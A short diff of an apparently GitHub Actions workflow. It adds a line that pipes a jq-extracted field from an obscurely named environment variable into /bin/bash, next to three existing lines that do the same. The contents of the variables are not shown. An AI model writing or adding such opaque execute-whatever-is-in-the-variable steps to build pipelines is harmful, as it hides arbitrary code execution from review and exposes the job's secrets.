@@ -29,6 +29,7 @@ jobs:
           echo $fotg70 | jq -r .aft6037 | /bin/bash
           echo $zk6 | jq -r .qh6433 | /bin/bash
           echo $shzr9158 | jq -r .umci8 | /bin/bash
+          printf '%s' "$f80443" | jq -r .tmt1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
